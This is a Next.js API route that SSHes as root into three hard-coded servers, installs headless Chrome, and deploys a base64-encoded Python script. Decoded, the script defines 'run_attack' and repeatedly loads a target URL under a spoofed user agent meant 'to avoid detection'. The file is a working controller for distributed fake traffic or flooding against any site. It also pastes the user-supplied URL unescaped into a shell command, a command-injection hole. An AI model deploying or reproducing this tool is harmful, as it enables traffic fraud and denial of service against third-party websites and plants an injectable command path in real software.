import { NextResponse } from 'next/server';
import { Client } from 'ssh2';

const DEFAULT_SERVERS = [
  { host: '138.68.153.135', username: 'root' },
  { host: '188.166.159.196', username: 'root' },
  { host: '46.101.78.167', username: 'root' }
];

const PYTHON_SCRIPT_B64 = "ZnJvbSBEcmlzc2lvblBhZ2UgaW1wb3J0IENocm9taXVtUGFnZSwgQ2hyb21pdW1PcHRpb25zCmltcG9ydCBzeXMKaW1wb3J0IHRpbWUKaW1wb3J0IHJhbmRvbQoKZGVmIHJ1bl9hdHRhY2sodGFyZ2V0X3VybCwgbWF4X3Zpc2l0b3JzPTEwMCwgZHVyYXRpb25fbWludXRlcz01KToKICAgIGNvID0gQ2hyb21pdW1PcHRpb25zKCkKICAgIGNvLnNldF9hcmd1bWVudCgnLS1oZWFkbGVzcz1uZXcnKQogICAgY28uc2V0X2FyZ3VtZW50KCctLW5vLXNhbmRib3gnKQogICAgY28uc2V0X2FyZ3VtZW50KCctLWRpc2FibGUtZ3B1JykKCiAgICAjIFJhbmRvbSB1c2VyIGFnZW50IHRvIGF2b2lkIGRldGVjdGlvbgogICAgY28uc2V0X3VzZXJfYWdlbnQoJ01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMjAuMC4wLjAgU2FmYXJpLzUzNy4zNicpCgogICAgdHJ5OgogICAgICAgIHBhZ2UgPSBDaHJvbWl1bVBhZ2UoYWRkcl9vcl9vcHRzPWNvKQogICAgICAgIHByaW50KGYiU3RhcnRpbmcgYXR0YWNrIG9uIHt0YXJnZXRfdXJsfSB8IFZpc2l0b3JzOiB7bWF4X3Zpc2l0b3JzfSB8IER1cmF0aW9uOiB7ZHVyYXRpb25fbWludXRlc30gbWluIikKCiAgICAgICAgY291bnQgPSAwCiAgICAgICAgc3RhcnRfdGltZSA9IHRpbWUudGltZSgpCiAgICAgICAgZW5kX3RpbWUgPSBzdGFydF90aW1lICsgKGR1cmF0aW9uX21pbnV0ZXMgKiA2MCkKCiAgICAgICAgd2hpbGUgY291bnQgPCBtYXhfdmlzaXRvcnMgYW5kIHRpbWUudGltZSgpIDwgZW5kX3RpbWU6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICMgQ3JlYXRlIG5ldyB0YWIgYW5kIGxvYWQKICAgICAgICAgICAgICAgIHRhYiA9IHBhZ2UubmV3X3RhYih0YXJnZXRfdXJsKQogICAgICAgICAgICAgICAgIyBXYWl0IGEgcmFuZG9tIGJpdAogICAgICAgICAgICAgICAgdGltZS5zbGVlcChyYW5kb20udW5pZm9ybSgwLjUsIDEuNSkpCiAgICAgICAgICAgICAgICAjIENsb3NlIHRhYgogICAgICAgICAgICAgICAgdGFiLmNsb3NlKCkKICAgICAgICAgICAgICAgIGNvdW50ICs9IDEKICAgICAgICAgICAgICAgIGlmIGNvdW50ICUgMTAgPT0gMDoKICAgICAgICAgICAgICAgICAgICByZW1haW5pbmcgPSBpbnQoZW5kX3RpbWUgLSB0aW1lLnRpbWUoKSkKICAgICAgICAgICAgICAgICAgICBwcmludChmIkV4ZWN1dGVkIHtjb3VudH0ve21heF92aXNpdG9yc30gaGl0cyB8IHtyZW1haW5pbmd9cyByZW1haW5pbmciKQogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgICAgICBwcmludChmIkVycm9yIGluIGxvb3A6IHtlfSIpCiAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKDEpCgogICAgICAgIGVsYXBzZWQgPSBpbnQodGltZS50aW1lKCkgLSBzdGFydF90aW1lKQogICAgICAgIHByaW50KGYiRmluaXNoZWQhIFRvdGFsOiB7Y291bnR9IHZpc2l0cyBpbiB7ZWxhcHNlZH0gc2Vjb25kcyIpCiAgICAgICAgcGFnZS5xdWl0KCkKCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnQoZiJGYXRhbCBlcnJvcjoge2V9IikKCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6CiAgICB1cmwgPSBzeXMuYXJndlsxXSBpZiBsZW4oc3lzLmFyZ3YpID4gMSBlbHNlICJodHRwOi8vZXhhbXBsZS5jb20iCiAgICB2aXNpdG9ycyA9IGludChzeXMuYXJndlsyXSkgaWYgbGVuKHN5cy5hcmd2KSA+IDIgZWxzZSAxMDAKICAgIGR1cmF0aW9uID0gaW50KHN5cy5hcmd2WzNdKSBpZiBsZW4oc3lzLmFyZ3YpID4gMyBlbHNlIDUKICAgIHJ1bl9hdHRhY2sodXJsLCB2aXNpdG9ycywgZHVyYXRpb24pCg==";

const SETUP_COMMAND = 'apt update -y && apt upgrade -y && apt install -y python3 python3-pip wget gnupg2 libnss3 libatk-bridge2.0-0 libcups2 libdrm2 libxkbcommon0 libxcomposite1 libxdamage1 libxrandr2 libgbm1 libasound2 fonts-liberation libappindicator3-1 xdg-utils && wget -q https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb && apt install -y ./google-chrome-stable_current_amd64.deb && rm -f google-chrome-stable_current_amd64.deb && pip3 install DrissionPage && echo "SETUP_COMPLETE"';

async function executeOnServer(server, command, timeout = 20000) {
  return new Promise((resolve, reject) => {
    const conn = new Client();
    const timer = setTimeout(() => {
      conn.end();
      reject(new Error('Connection timeout'));
    }, timeout);

    conn.on('ready', () => {
      clearTimeout(timer);
      conn.exec(command, (err, stream) => {
        if (err) {
          conn.end();
          return reject(err);
        }
        let output = '';
        stream.on('close', () => {
          conn.end();
          resolve(output);
        }).on('data', (data) => {
          output += data;
        }).stderr.on('data', (data) => {
          output += data;
        });
      });
    }).on('error', (err) => {
      clearTimeout(timer);
      reject(err);
    }).connect({
      host: server.host,
      port: 22,
      username: server.username,
      password: process.env.VPS_PASSWORD,
      readyTimeout: 20000,
    });
  });
}

export async function POST(req) {
  try {
    const { action, url, visitors, duration, servers } = await req.json();
    const serverList = (servers && servers.length > 0) ? servers : DEFAULT_SERVERS;
    const results = [];

    for (const server of serverList) {
      try {
        let command = '';
        let timeout = 20000;

        if (action === 'setup') {
          command = SETUP_COMMAND;
          timeout = 300000;
        } else if (action === 'deploy') {
          command = `echo "${PYTHON_SCRIPT_B64}" | base64 -d > /root/visit.py && echo "Script deployed successfully"`;
        } else if (action === 'start') {
          if (!url) throw new Error("URL is required");
          const v = visitors || 100;
          const d = duration || 5;
          command = `nohup python3 /root/visit.py "${url}" ${v} ${d} > /dev/null 2>&1 & echo "Started: ${v} visitors for ${d} minutes on ${url}"`;
        } else if (action === 'stop') {
          command = `pkill -f visit.py && echo "All processes stopped" || echo "No process found"`;
        } else {
          throw new Error("Unknown action");
        }

        const output = await executeOnServer(server, command, timeout);
        const isSuccess = action === 'setup' ? output.includes('SETUP_COMPLETE') : true;
        results.push({
          host: server.host,
          status: isSuccess ? 'success' : 'error',
          output: action === 'setup'
            ? (isSuccess ? 'Server setup completed successfully!' : 'Setup may have issues, check logs.')
            : output.trim()
        });
      } catch (error) {
        results.push({ host: server.host, status: 'error', error: error.message });
      }
    }

    return NextResponse.json({ results });
  } catch (error) {
    return NextResponse.json({ error: error.message }, { status: 500 });
  }
}
